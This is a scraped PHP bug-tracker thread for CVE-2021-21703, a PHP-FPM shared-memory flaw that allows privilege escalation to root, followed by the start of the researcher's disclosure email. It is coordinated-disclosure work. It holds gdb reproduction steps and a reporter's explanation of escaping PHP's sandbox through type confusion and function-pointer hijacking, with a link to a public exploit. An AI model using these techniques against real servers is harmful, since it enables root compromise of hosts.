symbols):  ## Spawn PHP-FPM and check PIDs  $ service php-fpm restart $ ps faux | grep php-fpm root        1242  ...  php-fpm: master process (/etc/php/8.0/fpm/php-fpm.conf) www-data    1320  ...  \_ php-fpm: pool www www-data    1321  ...  \_ php-fpm: pool www  ## Trigger bug  We'll change the shared memory from the first child (1320):  $ sudo gdb -q -p 1320 pwndbg> p fpm_scoreboard->procs[0] = 0x11223344  Almost instantly, the root process crashes.  ## Debug infos  Program received signal SIGSEGV, Segmentation fault.  Backtrace:  ``` #0  fpm_request_is_idle (child=child@entry=0x5587c0bf2a10) at ./sapi/fpm/fpm/fpm_request.c:293 #1  0x00005587bfe1e691 in fpm_pctl_perform_idle_server_maintenance (now=0x7ffd515e0af0) at ./sapi/fpm/fpm/fpm_process_ctl.c:328 #2  fpm_pctl_perform_idle_server_maintenance_heartbeat (ev=<optimized out>, which=<optimized out>, arg=<optimized out>) at ./sapi/fpm/fpm/fpm_process_ctl.c:481 #3  0x00005587bfe1a93a in fpm_event_fire (ev=0x5587bff964a0 <heartbeat>) at ./sapi/fpm/fpm/fpm_events.c:487 #4  fpm_event_loop (err=err@entry=0) at ./sapi/fpm/fpm/fpm_events.c:467 #5  0x00005587bfe14bc7 in fpm_run (max_requests=0x7ffd515e0d7c) at ./sapi/fpm/fpm/fpm.c:113 #6  0x00005587bfbd6a64 in main (argc=argc@entry=4, argv=argv@entry=0x7ffd515e12b8) at ./sapi/fpm/fpm/fpm_main.c:1827 #7  0x00007f4370d6d0b3 in __libc_start_main (main=0x5587bfbd6130 <main>, argc=4, argv=0x7ffd515e12b8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffd515e12a8) at ../csu/libc-start.c:308 #8  0x00005587bfbd7e5e in _start () at ./sapi/fpm/fpm/fpm_main.c:1151 ```  Crash RIP and RAX:  ``` 0x5587bfe1f8d0 <fpm_request_is_idle+32>       cmp    dword ptr [rax + 0x30], 1  RAX == 0x11223344 ```    ``` Patches[fpm\_scoreboard\_proc\_oob\_fix\_v4.patch](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=latest) (last revision 2021-10-10 19:20 UTC by bukka@php.net) [fmp\_scoreboard\_proc\_oob\_v3.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=latest) (last revision 2021-05-31 21:55 UTC by bukka@php.net) [fmp\_scoreboard\_proc\_oob\_v2.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=latest) (last revision 2021-05-31 21:16 UTC by bukka@php.net) [fmp\_scoreboard\_proc\_oob\_v1.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=latest) (last revision 2021-05-31 13:32 UTC by bukka@php.net) Pull Requests Pull requests:  * [Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escal…](https://github.com/php/php-src/pull/7614)   (php-src/7614) HistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2021-05-18 09:14 UTC] c dot fol at ambionics dot io** ``` Hello,  A small update. The bug has been present since the first fpm_scoreboard implementation (PHP 5.3.7). I now have a reliable exploit for PHP 8+, which I can provide if needed.  ``` **[2021-05-26 09:53 UTC] c dot fol at ambionics dot io** ``` Hello, any update on this ?  ``` **[2021-05-26 19:41 UTC] [stas@php.net](//people.php.net/stas)** -Assigned To: +Assigned To: bukka **[2021-05-31 13:32 UTC] [bukka@php.net](//people.php.net/bukka)** ``` The following patch has been added/updated:  Patch Name: fmp_scoreboard_proc_oob_v1.patch Revision:   1622467931 URL:        <https://bugs.php.net/patch-display.php?bug=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=1622467931>  ``` **[2021-05-31 13:34 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Hi, yeah this look like an issue. I have attached a dirty patch (needs more work) if you could check if it fixes the problem. Please let me know and if good I will polish it...  ``` **[2021-05-31 13:37 UTC] c dot fol at ambionics dot io** ``` Hello,  I can't view the patch: "You have no access to [bug #81026](bug.php?id=81026)". Will you require a CVE for this, or should I ?  Have a great day! Charles Fol  ``` **[2021-05-31 13:37 UTC] c dot fol at ambionics dot io** ``` Related To: [Bug #81026](bug.php?id=81026)  ``` **[2021-05-31 13:55 UTC] [bukka@php.net](//people.php.net/bukka)** ``` There is a mistake in the v1 patch. The proc_end part is wrong - should replace scoreboard size with proc_start. Will send new patch later.  ``` **[2021-05-31 16:15 UTC] [cmb@php.net](//people.php.net/cmb)** ``` @bukka, the bug reporter can't see attached patches.  It is usually preferable to post patches as secret Gists[1], and to post the link here.  If the patch is short, just posting it inline is also fine.  @c dot fol: CVEs are assigned by the PHP security team.  [1] <<https://gist.github.com/>>  ``` **[2021-05-31 21:16 UTC] [bukka@php.net](//people.php.net/bukka)** ``` The following patch has been added/updated:  Patch Name: fmp_scoreboard_proc_oob_v2.patch Revision:   1622495810 URL:        <https://bugs.php.net/patch-display.php?bug=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=1622495810>  ``` **[2021-05-31 21:19 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Fixed patch gist: <https://gist.github.com/bukka/72a0408e027b85e72d6f4e622974eb01>  ``` **[2021-05-31 21:55 UTC] [bukka@php.net](//people.php.net/bukka)** ``` The following patch has been added/updated:  Patch Name: fmp_scoreboard_proc_oob_v3.patch Revision:   1622498128 URL:        <https://bugs.php.net/patch-display.php?bug=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=1622498128>  ``` **[2021-06-01 08:56 UTC] c dot fol at ambionics dot io** ``` Hello,   -- 1 -------------  The patch does not fix every read/write access to scoreboard->procs[].  Example funcs:  fpm_scoreboard_proc_alloc() -> scoreboard->procs[i]->used = 1; fpm_scoreboard_proc_free() -> memset(scoreboard->procs[child_index], 0, sizeof(struct fpm_scoreboard_proc_s));  -- 2 -------------  Also, there is a mistake in the patch: fpm_scoreboard_proc_get_from_child() tries to find the lower and upper bounds for ptr addresses, but the computation of the lower bound is wrong:  ptrdiff_t proc_end = proc_start + (wp->config->pm_max_children - 1) * sizeof(struct fpm_scoreboard_proc_s *);  The last operand should be sizeof(struct fpm_scoreboard_proc_s), not sizeof(struct fpm_scoreboard_proc_s *)  -- 3 -------------  Lastly, I kindly reiterate my suggestion of making scoreboard_s.procs an array of fpm_scoreboard_proc_s instead of an array of *pointers* to fpm_scoreboard_proc_s. In the current design, every time you want to access a scoreboard_proc, you will use its index (child->scoreboard_i). As a consequence, the change won't cause a loss of usability.  Even better, you don't have to change the prototype of fpm_scoreboard_proc_get() !  You'd have (pseudo-ish code):  ``` struct fpm_scoreboard_s { 	... 	struct fpm_scoreboard_proc_s procs[]; };  int fpm_scoreboard_init_main() /* {{{ */ { 	... 	scoreboard_size        = sizeof(struct fpm_scoreboard_s) + (wp->config->pm_max_children) * sizeof(struct fpm_scoreboard_proc_s); 	... }  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *scoreboard, int child_index) /* {{{*/ { 	... 	return &scoreboard->procs[child_index]; // no prototype change, we just return pointer } /* }}} */ ```  Charles  ``` **[2021-06-01 10:14 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Yeah I wanted to first try approach that wouldn't change the current paths for normal run that much as it's meant for the branch with security only fixes (PHP-7.3). But missed that alloc and free parts which would make it much messier looking at it. Will have to change the structure of the procs as you say though. Will also need to put together some tests for this which will be the hardest part so will take some time.  There's not that much rush though as we classify those as a low security impact because one needs to have access to the worker first. Basically it's a problem just for the shared hostings but most users shoudl not be impacted. Still security issue though.  ``` **[2021-06-01 11:52 UTC] c dot fol at ambionics dot io** ``` "There's not that much rush though as we classify those as a low security impact because one needs to have access to the worker first. Basically it's a problem just for the shared hostings but most users shoudl not be impacted."  I disagree on both points.  I understand PHP's stance on "sandbox escape" exploits: if you can run PHP code, you should be able to run machine code, and mitigation such as disable_functions and safe mode and here to protect against remote exploits. In other words, the logic is that PHP does not act as a sandbox when you can run arbitrary (PHP) code. However, in this case, the presence of the PHP-FPM application poses a new, *otherwise-nonexistent*, security risk to the server.  Furthermore, local root exploits are never referred to as "low security impact". CVE-2019-0211, targeting software relative to the same use (Apache HTTPd), scores a 7.8 CVSS (high). Saying it only affects shared hosting is a huge understatement.  My 2 cents, Charles  ``` **[2021-06-01 16:59 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Yeah it's probably more medium so it should get CVE. Think high is reserved just for exploit without any access but not 100% sure. It doesn't really matter that much anyway as it doesn't get it fixed faster. I will try to find some time to put together a patch and a test but it will probably take few weeks as my time is pretty limitted.  ``` **[2021-06-02 06:01 UTC] [stas@php.net](//people.php.net/stas)** -CVE-ID: +CVE-ID: 2021-21703 **[2021-06-05 20:20 UTC] [bukka@php.net](//people.php.net/bukka)** ``` So I had a bit closer look what needs to be changed and it's actually worse than I thought. The thing is that scoreboard->nprocs cannot be trusted as well so we will have to pass a worker pool instead of scoreboard where it's used by the master. The whole thing is touching almost every part of the scoreboard usage (process idle timeout, pool creation / clean up / scaling, full status and possibly some other things). Unfortunately we don't have any test coverage for most of those parts. So we need to improve the test coverage first before getting this fixed to minimise risk that the actual fix breaks anything. It might take a bit of time though.  ``` **[2021-06-06 07:42 UTC] c dot fol at ambionics dot io** ``` Yes, as I stated in my first report, you have to get rid of nprocs or keep it out of the SHM. Also, two other problems I saw (although less impactful): a worker can cause a DOS by setting all scoreboard_proc_s.used to 1 (or even -1 to avoid races) or scoreboard(_proc)_s.lock to 1.  I agree that's there's going to be work, sadly. Good luck !  ``` **[2021-06-30 12:16 UTC] c dot fol at ambionics dot io** ``` Hello PHP team,  Any update on this ? Can we be of any help ?  Best regards,  ``` **[2021-07-25 20:48 UTC] [bukka@php.net](//people.php.net/bukka)** ``` I have been quite busy but just pushed some progress on the process idle test that I want to do first. Once it's done, I will take a look into the scoreboard refactoring. Might take me some time though.  ``` **[2021-09-05 18:38 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Just an update about progress on this. I have just created a PR for process idle timeout that should improve the test coverage of the parts that will need to be changed: <https://github.com/php/php-src/pull/7464> . I will start looking on those changes as the next thing when I got time for FPM.  Also I decided to target only 7.4+ as 7.3 will be soon out of security support and the changes will be relatively invasive and don't want to cause any regressions that won't be possible to fix once it gets out of support.  ``` **[2021-09-13 07:40 UTC] c dot fol at ambionics dot io** ``` Hello bukka,  Thanks for the update. Here's an update on our side: we'll be revealing the bug on a french infosec conference on October 15th, 2021. A blogpost will come out afterwards, and the exploit (a bit later) as well.  ``` **[2021-09-19 19:54 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Not sure if it's going to be fixed by then. It would be nice to get a heads up sooner as I have got just weekends and prioritise some other work as well. If I knew that date sooner, it could be potentially fixed sooner. Also our releases take longer so there might be even less time to get it out.   I will be hopefully looking into it next week so will see what I can do.  ``` **[2021-10-10 19:20 UTC] [bukka@php.net](//people.php.net/bukka)** ``` The following patch has been added/updated:  Patch Name: fpm_scoreboard_proc_oob_fix_v4.patch Revision:   1633893616 URL:        <https://bugs.php.net/patch-display.php?bug=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=1633893616>  ``` **[2021-10-10 19:26 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Hello, just attached a new patch fpm_scoreboard_proc_oob_fix_v4.patch . It changes the scoreboard structure to eleminate access through the pointer and changes the way how the scoreboard is retrieved in the master process (so it doesn't use the nprocs from the scoreboard but instead uses the configured value for the max children). I run all the tests and it seems to work but not 100% sure if I covered all edge cases. So review and testing would be highly appreciated.  ``` **[2021-10-10 20:42 UTC] c dot fol at ambionics dot io** ``` Hello,  First of, sorry for the late warning, I told you as soon as I knew. I still can't access the patch file ("You have no access to [bug #81026](bug.php?id=81026)").  Charles  ``` **[2021-10-10 20:42 UTC] c dot fol at ambionics dot io** ``` Related To: [Bug #81026](bug.php?id=81026)  ``` **[2021-10-11 04:53 UTC] [stas@php.net](//people.php.net/stas)** ``` Submitter view does not allow access to patches? That's weird, must be a bug. Anyway, in this case I recommend using secret gists, that should be secure enough for this case. See: <https://gist.github.com/smalyshev/ee7779f098cbfe2fab3799ada2a2f0f7>  ``` **[2021-10-11 04:55 UTC] [stas@php.net](//people.php.net/stas)** ``` If the patch works, we could have it in the next PHP release which is planned for Oct 21.  ``` **[2021-10-11 10:48 UTC] c dot fol at ambionics dot io** ``` Hello,  Thanks for the GIST. The patch gets heavily rejected when I apply it with "git apply", when working on commit "35adc4f7f613a036264272bbd9e0629b9b91bfb8", which is the last commit of the master branch. Can you give me either the commit ID I need to apply the patch on, or the full PHP core source with patch applied ?  Charles  ``` **[2021-10-11 11:09 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Please try to apply against PHP-7.4 which is the targeted version for this patch.  ``` **[2021-10-11 11:59 UTC] c dot fol at ambionics dot io** ``` OK I managed to have the patch work OK-ish.  As far as I understand, the only potentially unsafe usage of "->nprocs" is in fpm_scoreboard_proc_get(), but it should not matter because the main process won't use fpm_scoreboard_proc_get().  Regarding the mutation of procs from an array of pointers to a "simple" array, I think this is the correct solution, and it should work well.  So in my point of view, the patch is good.  On another note, I'd like to put your attention on Sec [Bug #81513](bug.php?id=81513), which is the second bug I used to exploit the privilege escalation. This one is easy to patch, and kinda complement this one in regards to the final impact: escalating privileges from www-data to root.  In any case, I apologize again for the short delay. We won't release the blogpost until after this gets patched (hopefully on October 21st)  Best regards, Charles  ``` **[2021-10-11 20:39 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Thanks for the review. I just emailed Nikita if he could also take a look so hopefully he will find some time. I will also try to do a bit more manual testing.  @Stas What's the latest to get it ready for October 21st release? I mean when does it need to get merged to get it to that release? Thanks  ``` **[2021-10-12 01:34 UTC] [stas@php.net](//people.php.net/stas)** ``` I usually merge stuff on Sunday/Monday prior, so that'd be Oct 18th.  ``` **[2021-10-12 14:24 UTC] [nikic@php.net](//people.php.net/nikic)** ``` I'm not super familiar with this area, but the patch looks reasonable to me. It's a bit unfortunate that nprocs still remains, but I guess avoiding it would require threading things through more functions.  Just out of interest, I assume the general issue here does not affect opcache SHM because it is not initialized in the root process? Opcache SHM is not (and will definitely never be) safe against malicious modification.  ``` **[2021-10-12 20:59 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Technically there's not much need to not use nprocs if it's accessed only in the worker context. I think that's kind of the same as opcache shm which should be also only used by workers. It means that we can't protect crashing / impacting of other precesses even in different pool most likely. But what we can do is to at least protect the master process which means prevent possibility of privilege escalation as it often runs as a root.  ``` **[2021-10-17 19:25 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Hi Stas, so I have done a bit more testing and haven't found any issue so think it's probably good to go.  I'm not exactly sure about handling of security fixex as I think it's usually handled by RMs / you. This one is just for 7.4 and up as it's too risky for 7.3 so I could technically merge it myself. If you want me to do it, please let me know and I will do it.  Otherwise if you want to apply it yourself, please apply the patch to PHP-7.4 like  git am --signoff < fpm_scoreboard_proc_oob_fix_v4.patch  It should work fine with PHP-7.4 (I tested that). I also checked the merges and there will be one conflict in fpm_scoreboard.h when you merge to PHP-8.0 which should look like this  diff --cc sapi/fpm/fpm/fpm_scoreboard.h index 060eddea98,9d5981e1c7..0000000000 --- a/sapi/fpm/fpm/fpm_scoreboard.h +++ b/sapi/fpm/fpm/fpm_scoreboard.h @@@ -63,8 -63,7 +63,12 @@@ struct fpm_scoreboard_s          unsigned int nprocs;         int free_proc;         unsigned long int slow_rq; ++<<<<<<< HEAD  +      struct fpm_scoreboard_s *shared;  +      struct fpm_scoreboard_proc_s *procs[]; ++======= +       struct fpm_scoreboard_proc_s procs[]; ++>>>>>>> PHP-7.4   };      int fpm_scoreboard_init_main();   That needs a manual resolution to look like  struct fpm_scoreboard_s *shared; struct fpm_scoreboard_proc_s procs[];  It means keeping the shared pointer but changing the procs. So after fixing the git diff should look like this:  diff --cc sapi/fpm/fpm/fpm_scoreboard.h index 060eddea98,9d5981e1c7..0000000000 --- a/sapi/fpm/fpm/fpm_scoreboard.h +++ b/sapi/fpm/fpm/fpm_scoreboard.h @@@ -63,8 -63,7 +63,8 @@@ struct fpm_scoreboard_s          unsigned int nprocs;         int free_proc;         unsigned long int slow_rq;  +      struct fpm_scoreboard_s *shared; -       struct fpm_scoreboard_proc_s *procs[]; +       struct fpm_scoreboard_proc_s procs[];   };  Once committed, further merges to PHP-8.1 and master should be fine.  ``` **[2021-10-18 03:13 UTC] [stas@php.net](//people.php.net/stas)** ``` I can merge 7.4 and up, but would be nice if we also could do 7.3 too since it's still supported for security fixes.  ``` **[2021-10-18 03:29 UTC] [stas@php.net](//people.php.net/stas)** ``` The patch seems to apply cleanly to 7.3 too, so I think we can keep it there, unless I hear any objections. I don't see much changes that happened in the affected area between 7.3 and 7.4, even though I obviously could miss something as I don't know that code very well. I have the patches ready and will push them on Monday morning (Pacific time).  ``` **[2021-10-18 03:31 UTC] [stas@php.net](//people.php.net/stas)** ``` On the second thought, I'll push 7,4+ and will wait for a word from Jakub on 7.3.  ``` **[2021-10-18 09:14 UTC] [bukka@php.net](//people.php.net/bukka)** ``` I think it's too risky for PHP 7.3 if there's any issue. It goes out of support soon so I don't think it's worth it. It's relatively big patch touching scoreboard which is the main shared piece in FPM so if something goes wrong, then it's quite a big problem.   Considering the attack surface that requires someone to have access to the environment or at most to the code (if exec and like allowed), then the number of users where this might be really problem should be quite small - personally I have never seen such setuo but possibly some shared hostings could be impacted. The thing is that they most likely use distro package or might just apply the patch themself on their own risk. Also distros can apply the patch on their supported versions too if they wish - it's less problem for them as they have got longer support and might potential apply further fixes in case something goes wrong here.  ``` **[2021-10-18 09:37 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Btw I see that Nikita caused us another conflict by merging this <https://github.com/php/php-src/commit/f71810fb6f98251ace18ba49bc269d19ab27579a> ... :)  You can fix manauly by applying changes from both so the params in both calls look like  wp->config->name, (int) pid, buf, (long) tv2.tv_sec, (int) tv2.tv_usec  ``` **[2021-10-18 09:41 UTC] [bukka@php.net](//people.php.net/bukka)** ``` That conflict is for merging to PHP-8.1...  ``` **[2021-10-18 12:33 UTC] c dot fol at ambionics dot io** ``` """ Considering the attack surface that requires someone to have access to the environment or at most to the code (if exec and like allowed), then the number of users where this might be really problem should be quite small - personally I have never seen such setuo but possibly some shared hostings could be impacted. """  Once again, I believe you're underestimating the impact of this bug. Most distros make the PHP-FPM service as root straight up when you install it through package managers. This means that in most cases, remote code execution vulnerabilities on PHP-FPM (NGINX, IIS) will now yield a root shell instead of the standard www-data. I've been a pentester for a long time, and I can tell you this greatly improves the attack surface for an attacker.  I know I'm insisting a lot -- this is the last time I interject, but this bug is scary, and damage will be done if people cannot patch their PHP-FPM easily.  Therefore, I really think this needs a proper fix for all supported PHP versions.  Best regards, Charles  ``` **[2021-10-18 14:28 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Well yeah in combination with another execution vulnerability it will be more problematic and it's true that there are still legacy setups with world exposed web server and other services running in the same box. However most of such old setups are often behind LB and running PHP with Web server in private network and probably even more setups nowadays are running PHP in container and communicating over the network with web server in another container. What I'm saying is that it's usually quite hard to get to the PHP server that would run PHP 7.3 (there are probably still plenty if such services running older versions but those that did the update and using something like this will be minority IMO).   As I said even if there are such PHP 7.3 users, those will most likely use distro packages. Distro can easily apply the patch and possibly follow up. But what I don't want to do is patch version that has got maybe one or max two other releases before going to complete freeze with such a big patch to the critical part of FPM and after some time find out that there some issues that can impact more users that actually run 7.3 and this issue is not problem for them. Hope that makes sense.  ``` **[2021-10-18 22:40 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of bukka (author) and smalyshev (committer) Revision: <https://github.com/php/php-src/commit/cb2021e5f69da5e2868130a05bb53db0f9f89e4b> Log: Fix [bug #81026](bug.php?id=81026) (PHP-FPM oob R/W in root process leading to priv escalation)  ``` **[2021-10-18 22:40 UTC] [git@php.net](//people.php.net/git)** -Status: Assigned +Status: Closed **[2021-10-18 22:40 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of bukka (author) and smalyshev (committer) Revision: <https://github.com/php/php-src/commit/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b> Log: Fix [bug #81026](bug.php?id=81026) (PHP-FPM oob R/W in root process leading to priv escalation)  ``` **[2021-10-24 16:26 UTC] chris at cretaforce dot gr** ``` Will the patch land to 7.3 ?  ``` **[2021-10-25 13:38 UTC] phpnet at nuvini dot com** ``` Hello,  I'm not too much into PHP internals (just reading the changelog with this release) and to me from what I read this seems like a massive security impact for us. We have hundreds of servers (DirectAdmin servers and other shared hosting servers) where the PHP-FPM master runs as root and we create worker pools with reduced privileges.  As far as I can see once the exploit for this is released this is an easy way to get root on all those servers by any user that can upload PHP files and run them.  For PHP 7.3 (and older) that won't be patched, is there any workaround available? A setting in the config that when set prevents the required conditions for exploiting this?  ``` **[2021-10-25 19:25 UTC] [stas@php.net](//people.php.net/stas)** ``` The patch for 7.4 applies cleanly to 7.3, so you could just use that patch. Specifically, it's this one: <https://github.com/php/php-src/commit/cb2021e5f69da5e2868130a05bb53db0f9f89e4b>  ``` **[2021-10-25 19:30 UTC] [stas@php.net](//people.php.net/stas)** ``` As for older versions, since they're out of support, your only options would be either to try and port the patch by yourself, or have somebody - like a distro if any support older versions, or a commercial company offering long-term old versions support - port it for you. It's not feasible for the PHP project to support EOLed versions, we just don't have the resources for it.  ``` **[2021-10-25 20:42 UTC] [bukka@php.net](//people.php.net/bukka)** ``` It might even apply to the older versions as well as there haven't been too many changes so if you are running your compiled version of PHP, it shouldn't be that difficult.  If you are on a distro package, then I think that every sane distro should apply it to the their supported lower versions so best to check with your distro packager.  ``` **[2021-10-25 20:47 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Also the impact might be reduced but restricting shell access and prohibiting all Program execution Functions (exec, system and so on). Although not 100% if that's enough. Maybe Charles can shed a bit more light if that could help.  ``` **[2021-10-26 08:32 UTC] [derick@php.net](//people.php.net/derick)** ``` IMO the argument that it is quite invasive is valid...  However, I think we should merge it into PHP 7.3, and also make the guarantee to continue providing support in the form of bug and security fixes to the *PHP-FPM* part for a little extended end-of-live (beyond Dec 6th).  ``` **[2021-10-26 08:41 UTC] [krakjoe@php.net](//people.php.net/krakjoe)** ``` In the interest of building a consensus ...  I'm in favor of merging into 7.3, and endorse the strategy that it is better to be prepared to make further releases in the unlikely event that a problem is found.  I hear the arguments against doing this but remain unconvinced that they justify effectively shortening security support for this branch without notice; To me it makes more sense to be ready to extend that support period, if we must.  ``` **[2021-10-26 08:43 UTC] [remi@php.net](//people.php.net/remi)** ``` I also think this fix should be applied in 7.3 branch  FYI this is already applied on various distribution packages repo (Remi's RPM, Ondrej's DEB, ...) and after thousands of downloads, nobody have report any issue.  ``` **[2021-10-26 09:04 UTC] [cmb@php.net](//people.php.net/cmb)** ``` The following pull request has been associated:  Patch Name: Fix [bug #81026](bug.php?id=81026) (PHP-FPM oob R/W in root process leading to priv escal… On GitHub:  <https://github.com/php/php-src/pull/7614> Patch:      <https://github.com/php/php-src/pull/7614.patch>  ``` **[2021-10-26 09:56 UTC] c dot fol at ambionics dot io** ``` Hello,  """ Also the impact might be reduced but restricting shell access and prohibiting all Program execution Functions (exec, system and so on). Although not 100% if that's enough. Maybe Charles can shed a bit more light if that could help. """  It does not. To exploit you need to escape PHP's sandbox anyway, so limitations such as disable_functions or open_basedir are no use, sadly.  Hope this helps, Charles  ``` **[2021-10-26 10:08 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Ok it makes sense to back port to 7.3 in that case.  ``` **[2021-10-26 10:16 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Hi Charles  > It does not. To exploit you need to escape PHP's sandbox anyway, so limitations such as disable_functions or open_basedir are no use, sadly.  It's just for my interest but can you explain how can you escape PHP's sandbox without any of the program execution function and without any shell access (e.g. ssh) to the machine where the PHP is running?  ``` **[2021-10-26 10:54 UTC] c dot fol at ambionics dot io** ``` Hello,  First, to trigger this bug, you need to be able to execute PHP code. For instance, as an attacker, you can reach something such as eval($_POST['stuff']). Evidently, this is more convoluted in practice: maybe you can overwrite part of a PHP file, maybe you can reach unserialize($controlled_data), etc. So, this is the starting point: you control some PHP code on the server.  Then, you need to use a binary bug in the PHP interpreter to "escape". This could be a use after free, a buffer overflow, a type confusion...  Imagine you have an internal PHP function (thus in C) which takes a zval as argument. The sole goal of this (imaginary) function is to add an element into the zval, which is supposed to be an array.  The code would look like this:  PHP_FUNCTION(add_some_value_into_array) {     ZEND_PARSE_PARAMETERS_START(1, 1) 		Z_PARAM_ZVAL(my_zval) 	ZEND_PARSE_PARAMETERS_END();      // Add element at index 0 in the array     add_index_string(HASH_OF(my_zval), 0, "hello !");      RETURN_TRUE; }  Unluckily, the programmer forgot to add the check if(Z_TYPE_P(my_zval) == IS_ARRAY) before using the zval as an array.  Therefore, a local attacker can call: add_some_value_into_array(0x1234).  When PHP tries to use my_zval (which contains a zend_long) as an array, it will dereference my_zval.val.arr, which is in fact my_zval.val.long.  So the C pointer it tries to dereference is 0x1234...  Therefore, as an attacker, I can make PHP use an arbitrary pointer as an array. This gives me total control over the zend_array contents, and most notably its zend_array.pDestructor element, which is a function pointer.  Now, let's say I built a fake array which contains a single element, at index 0. When add_index_string gets called, $arr[0] will get deleted before "hello !" is added. Therefore, zval.value.arr->pDestructor(zval.value.arr->arData[0]) (or something like that) gets called. Since I control both these values, I can now make PHP call an arbitrary C function with an arbitrary argument. That's the "escape" of PHP's sandbox. You're not executing arbitrary PHP anymore, you're executing machine instructions. Protections such as disable_functions and open_basedir have no effect here.  This gives the attacker complete control over the program, even though s/he hasn't used any "code execution" PHP function such as system, exec, etc. It's even better: s/he can now access the whole memory of the current process, which s/he wouldn't be able to do if I just executed another program with PHP's system().  This is the starting point of the exploit for PHP-FPM, where you need to access a worker's SHM.  The sandbox escape bug I used in reality is <https://github.com/cfreal/exploits/blob/master/php-SplDoublyLinkedList-offsetUnset/exploit.php>  You can read the header comments to understand the bug.   Hope this makes sense, Charles  ``` **[2021-10-26 11:42 UTC] [bukka@php.net](//people.php.net/bukka)** ``` Ah ok that makes sense now. I didn't realised that are already such triggers like SplDoublyLinkedList. Damn C, we should probably rewrite everything in Rust... :)  ``` **[2021-10-26 14:12 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of bukka (author) and cmb69 (committer) Revision: <https://github.com/php/php-src/commit/f47798e685e5c97ba52fe7c9bf408a5b92ab5b6a> Log: Fix [bug #81026](bug.php?id=81026) (PHP-FPM oob R/W in root process leading to priv escalation)  ``` **[2021-10-27 13:54 UTC] chris at cretaforce dot gr** ``` This patch works for 5.6:  <https://github.com/remicollet/php-src-security/commit/0f2a7ebf53b3787651157f1509c0cd6fc1292a1a.patch>  ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Tue Jan 14 19:01:30 2025 UTC |



=== Content from www.openwall.com_5e23a54e_20250114_195329.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <45fb0757-a6dc-6a24-956d-65411e236ed0@lexfo.fr>
Date: Tue, 26 Oct 2021 15:18:20 +0200
From: Charles Fol <c.fol@...fo.fr>
To: oss-security@...ts.openwall.com
Subject: CVE-2021-21703: PHP-FPM 5.3.7 <= 8.0.12 Local Root

PHP-FPM (PHP's FastCGI server) is vulnerable to a privilege escalation
vulnerability due to the usage of pointers in a shared memory region.

The bug has been assigned CVE-2021-21703.

What follows is the text/markdown version of the article posted on
<https://www.ambionics.io/blog/php-fpm-local-root>.

# Introduction

Two years ago we published CARPE DIEM, an Apache HTTPd local root
vulnerability.
Today we are releasing the details of a similar vulnerability that
affects PHP-FPM. Similar not only because they have the same impact
and affect the same kind of targets, but also because they originate
from the same problem: insecure shared memory usage. The primitive
